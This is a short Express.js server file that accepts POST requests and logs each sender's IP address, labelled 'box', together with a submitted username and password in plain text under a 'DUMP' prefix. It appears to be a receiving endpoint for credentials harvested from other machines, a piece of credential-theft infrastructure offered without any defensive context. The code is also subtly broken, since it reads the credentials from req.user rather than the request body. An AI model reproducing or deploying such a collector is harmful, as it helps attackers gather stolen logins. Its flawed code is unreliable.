const express = require("express");
const app = express();
const port = 3000;

app.use(express.json());

app.post("/", (req, res) => {
	const { username, password } = req.user;
	const box = req.ip;

	console.log(`DUMP: box ${box} | ${username}:${password}`);
	res.send("0");
});

app.listen(port, () => {
	console.log(`Server running on http://localhost:${port}`);
});
